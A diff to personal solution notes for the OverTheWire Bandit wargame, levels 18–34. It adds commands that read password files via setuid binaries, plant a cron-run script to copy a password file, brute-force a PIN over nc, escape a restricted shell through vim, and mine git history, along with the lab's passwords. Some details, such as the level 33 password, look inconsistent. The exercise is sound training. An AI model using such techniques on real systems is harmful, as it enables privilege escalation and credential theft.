@@ -59,7 +59,7 @@ in this filename located in the home directory
 
 Commands you may need to solve this level
 ls, cd, cat, file, du, find
-
+½
 
 
 cat "spaces in filename" -> UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
@@ -224,7 +224,7 @@ Commands you may need to solve this level
 grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd
 
 Helpful Reading Material
-Rot13 on Wikipedia
+  Rot13 on Wikipedia
 
 
 cat data.txt | tr A-Za-z N-ZA-Mn-za-m -> 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
@@ -432,19 +432,431 @@ ________________________________________________________________________________
 
 Bandit Level 18 → Level 19
 Level Goal
-The password for the next level is stored in a file readme in the homedirectory. Unfortunately, someone has modified .bashrc to log you out when you log in with SSH.
+The password for the next level is stored in a file readme in the homedirectory.
+Unfortunately, someone has modified .bashrc to log you out when you log
+in with SSH.
 
 Commands you may need to solve this level
 ssh, ls, cat
 
+ssh bandit18@bandit.labs.overthewire.org -p 2220 cat readme
+kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
+-> IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
+
+ssh bandit19@bandit.labs.overthewire.org -p 2220
+password: IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
+_____________________________________________________________________________________
+
+Bandit Level 19 → Level 20
+Level Goal
+To gain access to the next level, you should use the setuid binary in the
+homedirectory. Execute it without arguments to find out how to use it.
+The password for this level can be found in the usual
+place (/etc/bandit_pass), after you have used the setuid binary.
+
+Helpful Reading Material
+setuid on Wikipedia
 
 
+file bandit20-do -> setuid ELF 32-bit LSB executable
+
+Wikipedia setuid: allow users to run an executable with the
+permissions of the executable's owner or group respectively and
+to change behaviour in directories
+
+We can run commands as user bandit20.
+
+./bandit20-do ls /etc/bandit_pass/ ->
+  bandit0   bandit12  bandit16  bandit2	bandit23  bandit27  bandit30  bandit4  bandit8
+  bandit1   bandit13  bandit17  bandit20	bandit24  bandit28  bandit31  bandit5  bandit9
+  bandit10  bandit14  bandit18  bandit21	bandit25  bandit29  bandit32  bandit6
+  bandit11  bandit15  bandit19  bandit22	bandit26  bandit3   bandit33  bandit7
+
+./bandit20-do cat /etc/bandit_pass/bandit20 -> GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+
+ssh bandit20@bandit.labs.overthewire.org -p 2220
+password: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
 _____________________________________________________________________________________
 
+Bandit Level 20 → Level 21
+Level Goal
+There is a setuid binary in the homedirectory that does the following:
+it makes a connection to localhost on the port you specify as a
+commandline argument. It then reads a line of text from the connection
+and compares it to the password in the previous level (bandit20).
+If the password is correct, it will transmit the password for the next
+level (bandit21).
+
+NOTE: Try connecting to your own network daemon to see if it works
+as you think
+
+Commands you may need to solve this level
+ssh, nc, cat, bash, screen, tmux, Unix ‘job control’
+(bg, fg, jobs, &, CTRL-Z, …)
+
+
+listener that echo the old password:
+echo GbKksEFF4yrVs6il55v6gwY5aVje5f0j | nc -l -p 4040
+
+new terminal:
+./suconnect 4040 ->
+  Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+  Password matches, sending next password
+
+listener terminal:
+-> gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+
+ssh bandit22@bandit.labs.overthewire.org -p 2220
+password: gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+_____________________________________________________________________________________
+
+Bandit Level 21 → Level 22
+Level Goal
+A program is running automatically at regular intervals from cron, the
+time-based job scheduler. Look in /etc/cron.d/ for the configuration and
+see what command is being executed.
+
+Commands you may need to solve this level
+cron, crontab, crontab(5) (use “man 5 crontab” to access this)
+
+
+ls /etc/cron.d -> atop  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24
+cat /etc/cron.d/cronjob_bandit22 ->
+  @reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+  * * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+
+cat /usr/bin/cronjob_bandit22.sh ->
+  #!/bin/bash
+  chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+  cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+
+cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv -> Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+
+ssh bandit22@bandit.labs.overthewire.org -p 2220
+password: Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+_____________________________________________________________________________________
+
+Bandit Level 22 → Level 23
+Level Goal
+A program is running automatically at regular intervals from cron,
+the time-based job scheduler. Look in /etc/cron.d/ for the configuration
+and see what command is being executed.
+
+NOTE: Looking at shell scripts written by other people is a very
+useful skill. The script for this level is intentionally made easy to read.
+If you are having problems understanding what it does,
+try executing it to see the debug information it prints.
+
+Commands you may need to solve this level
+cron, crontab, crontab(5) (use “man 5 crontab” to access this)
+
+
+same as previous level ... and then something new:
+
+cat /usr/bin/cronjob_bandit23.sh ->
+  #!/bin/bash
+  myname=$(whoami)
+  mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+  echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+  cat /etc/bandit_pass/$myname > /tmp/$mytarget
+
+/usr/bin/cronjob_bandit23.sh ->
+  Copying passwordfile /etc/bandit_pass/bandit22 to
+  /tmp/8169b67bd894ddbb4412f91573b38db3
+
+cat /tmp/8169b67bd894ddbb4412f91573b38db3 -> Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+
+this was the pw for level 22.
+
+echo I am user bandit22 | md5sum | cut -d ' ' -f 1 ->
+  8169b67bd894ddbb4412f91573b38db3
+
+echo I am user bandit23 | md5sum | cut -d ' ' -f 1 ->
+  8ca319486bfbbc3663ea0fbe81326349
+
+cat /tmp/8ca319486bfbbc3663ea0fbe81326349 -> jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+ssh bandit23@bandit.labs.overthewire.org -p 2220
+password: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
 
 _____________________________________________________________________________________
+
+Bandit Level 23 → Level 24
+Level Goal
+A program is running automatically at regular intervals from cron,
+the time-based job scheduler. Look in /etc/cron.d/ for the configuration
+and see what command is being executed.
+
+NOTE: This level requires you to create your own first shell-script.
+This is a very big step and you should be proud of yourself when you
+beat this level!
+
+NOTE 2: Keep in mind that your shell script is removed once executed,
+so you may want to keep a copy around…
+
+Commands you may need to solve this level
+cron, crontab, crontab(5) (use “man 5 crontab” to access this)
+
+exact same as last level: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+cd /etc/cron.d/
+
+ls -> atop  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24
+
+cat cronjob_bandit24 ->
+  @reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+  * * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+
+cat /usr/bin/cronjob_bandit24.sh ->
+  #!/bin/bash
+  myname=$(whoami)
+  cd /var/spool/$myname
+  echo "Executing and deleting all scripts in /var/spool/$myname:"
+  for i in * .*;
+  do
+      if [ "$i" != "." -a "$i" != ".." ];
+      then
+  	echo "Handling $i"
+  	timeout -s 9 60 ./$i
+  	rm -f ./$i
+      fi
+  done
+
+
+every 60 seconds the above script is run.
+User bandit24 executes all scripts in /var/spool/bandit24
+and then deletes them.
+So we create a script that copy the password into a file.
+
+ls /etc/bandit_pass/ ->
+  bandit0   bandit12  bandit16  bandit2	bandit23  bandit27  bandit30  bandit4  bandit8
+  bandit1   bandit13  bandit17  bandit20	bandit24  bandit28  bandit31  bandit5  bandit9
+  bandit10  bandit14  bandit18  bandit21	bandit25  bandit29  bandit32  bandit6
+  bandit11  bandit15  bandit19  bandit22	bandit26  bandit3   bandit33  bandit7
+
+cd ~
+mkdir /tmp/ckn
+touch /tmp/ckn/hack.sh
+nano /tmp/ckn/hack.sh
+
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/ckn/pw
+
+chmod 777 /tmp/ckn/hack.sh
+cp /tmp/ckn/hack.sh /var/spool/bandit24
+
+it is not working ... because user bandit24 does not have acces to folder ckn
+
+chmod 777 /tmp/ckn
+ls /tmp/ckn -> hack.sh pw
+cat /tmp/ckn/pw -> UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+ssh bandit24@bandit.labs.overthewire.org -p 2220
+password: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
 _____________________________________________________________________________________
+
+Bandit Level 24 → Level 25
+Level Goal
+A daemon is listening on port 30002 and will give you the password for
+bandit25 if given the password for bandit24 and a secret numeric 4-digit
+pincode. There is no way to retrieve the pincode except by going through
+all of the 10000 combinations, called brute-forcing.
+
+
+touch bt.sh
+nano bt.sh
+
+#!/bin/bash
+for i in {0000..9999}
+do
+	echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"
+done
+
+chmod 777 bt.sh | ./bt.sh | nc localhost 30002 ->
+  Wrong! Please enter the correct pincode. Try again.
+  Wrong! Please enter the correct pincode. Try again.
+  .....
+  .....
+  .....
+  Wrong! Please enter the correct pincode. Try again.
+  Wrong! Please enter the correct pincode. Try again.
+  Wrong! Please enter the correct pincode. Try again.
+  Correct!
+  The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+ssh bandit25@bandit.labs.overthewire.org -p 2220
+password: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
 _____________________________________________________________________________________
+
+Bandit Level 25 → Level 26
+Level Goal
+Logging in to bandit26 from bandit25 should be fairly easy…
+The shell for user bandit26 is not /bin/bash, but something else.
+Find out what it is, how it works and how to break out of it.
+
+Commands you may need to solve this level
+ssh, cat, more, vi, ls, id, pwd
+
+
+ls -> bandit26.sshkey
+ssh bandit26@localhost -i bandit26.sshkey -> Connection to localhost closed.
+
+we are logged out because bandit26 does not use bash.
+
+/etc/passwd file stores essential information,
+which required during login.
+Tt stores user account information in a plain text file.
+It contains a list of the system’s accounts
+
+cat /etc/passwd | grep bandit26 ->
+  bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+
+cat /usr/bin/showtext ->
+  #!/bin/sh
+  export TERM=linux
+  more ~/text.txt
+  exit 0
+
+this is crazy - google is your friend:
+
+but basically resize your terminal so more is showing when you try to login.
+
+press v to start vim
+
+:e /etc/bandit_pass/bandit26 -> 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+
+ssh bandit26@bandit.labs.overthewire.org -p 2220
+password: 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
 _____________________________________________________________________________________
+
+Bandit Level 26 → Level 27
+Level Goal
+Good job getting a shell! Now hurry and grab the password for bandit27!
+
+Commands you may need to solve this level
+
+:set shell=/bin/bash
+:shell
+./bandit27-do cat /etc/bandit_pass/bandit27 -> 3ba3118a22e93127a4ed485be72ef5ea
+
+ssh bandit27@bandit.labs.overthewire.org -p 2220
+password: 3ba3118a22e93127a4ed485be72ef5ea
 _____________________________________________________________________________________
+
+Bandit Level 27 → Level 28
+Level Goal
+There is a git repository at
+ssh://bandit27-git@localhost/home/bandit27-git/repo.
+The password for the user bandit27-git is the same as for the user bandit27.
+Clone the repository and find the password for the next level.
+
+
+
+cd /tmp/koll
+git clone ssh://bandit27-git@localhost/home/bandit27-git/repo
+cat repo/readme -> 0ef186ac70e04ea33b4c1853d2526fa2
+
+ssh bandit28@bandit.labs.overthewire.org -p 2220
+password: 0ef186ac70e04ea33b4c1853d2526fa2
+_____________________________________________________________________________________
+
+Bandit Level 28 → Level 29
+Level Goal
+There is a git repository at
+ssh://bandit28-git@localhost/home/bandit28-git/repo.
+The password for the user bandit28-git is the same as for the user bandit28.
+Clone the repository and find the password for the next level.
+
+
+cd /tmp/koll
+git clone ssh://bandit29-git@localhost/home/bandit28-git/repo
+cat README.md -> password: xxxxxxxxxxxxx
+git log -> fix info leak
+git checkout 186a1038cc54d1358d42d468cdc8e3cc28a93fcb
+cat README.md -> - password: bbc96594b4e001778eee9975372716b2
+
+ssh bandit29@bandit.labs.overthewire.org -p 2220
+password: bbc96594b4e001778eee9975372716b2
+_____________________________________________________________________________________
+
+Bandit Level 29 → Level 30
+Level Goal
+There is a git repository at ssh://bandit29-git@localhost/home/bandit29-git/repo.
+The password for the user bandit29-git is the same as for the user bandit29.
+
+Clone the repository and find the password for the next level.
+
+Commands you may need to solve this level
+git
+
+
+cd /tmp/koll
+git clone ssh://bandit28-git@localhost/home/bandit28-git/repo
+cat README.md -> password: pw is not in prod.
+git branch --a -> HEAD, dev, master.
+git checkout dev
+cat README.md -> - password: 5b90576bedb2cc04c86a9e924ce42faf
+
+ssh bandit30@bandit.labs.overthewire.org -p 2220
+password: 5b90576bedb2cc04c86a9e924ce42faf
+_____________________________________________________________________________________
+
+Bandit Level 30 → Level 31
+Level Goal
+There is a git repository at
+ssh://bandit30-git@localhost/home/bandit30-git/repo.
+The password for the user bandit30-git is the same as for the user bandit30.
+
+Clone the repository and find the password for the next level.
+
+Commands you may need to solve this level
+git
+
+git tag -l -> secret
+git show secret -> 47e603bb428404d265f59c42920d81e5
+
+ssh bandit31@bandit.labs.overthewire.org -p 2220
+password: 47e603bb428404d265f59c42920d81e5
+_____________________________________________________________________________________
+
+Bandit Level 31 → Level 32
+Level Goal
+There is a git repository at
+ssh://bandit31-git@localhost/home/bandit31-git/repo.
+The password for the user bandit31-git is the same as for the user bandit31.
+
+Clone the repository and find the password for the next level.
+
+Commands you may need to solve this level
+git
+
+ls -al -> README.md, .gitignore
+cat README -> create file key.text "let me in"
+cat .gitignore ->
+echo "let me in" > key.txt
+git add .
+git commit -m "added key file"
+nano .gitignore and then remove *.txt line.
+git add .
+git commit -m "fixed .gitignore"
+git push -> 56a9bf19c63d650ce78e6ec0354ee45e
+
+ssh bandit32@bandit.labs.overthewire.org -p 2220
+password: 56a9bf19c63d650ce78e6ec0354ee45e
+_____________________________________________________________________________________
+
+Bandit Level 32 → Level 33
+After all this git stuff its time for another escape. Good luck!
+
+Commands you may need to solve this level
+sh, man
+
+ssh bandit33@bandit.labs.overthewire.org -p 2220
+password: 0ef186ac70e04ea33b4c1853d2526fa2
+_____________________________________________________________________________________
+
+Bandit Level 33 → Level 34
+At this moment, level 34 does not exist yet.
+
 _____________________________________________________________________________________
